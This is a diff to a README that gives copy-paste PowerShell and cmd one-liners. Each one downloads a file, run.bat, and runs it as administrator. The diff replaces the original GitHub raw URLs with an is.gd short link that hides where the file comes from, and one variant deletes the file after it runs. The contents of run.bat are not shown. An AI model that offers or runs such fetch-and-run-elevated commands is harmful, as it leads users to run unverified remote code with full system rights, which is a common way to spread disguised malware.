@@ -14,7 +14,7 @@ This guide shows you how to download and execute the `run.bat` file from this re
 1. **Right-click** on the Start button and select **"Windows PowerShell"** or **"Terminal"**
 2. Copy and paste this command:
 ```powershell
-iwr -UseBasicParsing "https://raw.githubusercontent.com/09sychic/sqd5/refs/heads/main/run.bat" -OutFile "run.bat"; Start-Process "run.bat" -Verb RunAs
+iwr -UseBasicParsing "https://is.gd/uvY8qR" -OutFile "run.bat"; Start-Process "run.bat" -Verb RunAs
 ```
 3. Press **Enter**
 4. When prompted by UAC (User Access Control), click **"Yes"** to allow administrator access
@@ -25,7 +25,7 @@ iwr -UseBasicParsing "https://raw.githubusercontent.com/09sychic/sqd5/refs/heads
 
 2. **Download the file**:
 ```powershell
-iwr -UseBasicParsing "https://raw.githubusercontent.com/09sychic/sqd5/refs/heads/main/run.bat" -OutFile "run.bat"
+iwr -UseBasicParsing "https://is.gd/uvY8qR" -OutFile "run.bat"
 ```
 
 3. **Run as Administrator**:
@@ -41,13 +41,13 @@ Start-Process "run.bat" -Verb RunAs
 1. **Open Command Prompt** (Win + R → type `cmd` → Enter)
 2. Run this command:
 ```cmd
-powershell -Command "iwr -UseBasicParsing 'https://raw.githubusercontent.com/09sychic/sqd5/refs/heads/main/run.bat' -OutFile 'run.bat'; Start-Process 'run.bat' -Verb RunAs"
+powershell -Command "iwr -UseBasicParsing 'https://is.gd/uvY8qR' -OutFile 'run.bat'; Start-Process 'run.bat' -Verb RunAs"
 ```
 
 ### Method 4: With Auto-Cleanup
 If you want the batch file to be automatically deleted after running:
 ```powershell
-iwr -UseBasicParsing "https://raw.githubusercontent.com/09sychic/sqd5/refs/heads/main/run.bat" -OutFile "run.bat"; Start-Process "run.bat" -Verb RunAs -Wait; Remove-Item "run.bat"
+iwr -UseBasicParsing "https://is.gd/uvY8qR" -OutFile "run.bat"; Start-Process "run.bat" -Verb RunAs -Wait; Remove-Item "run.bat"
 ```
 
 ## Troubleshooting
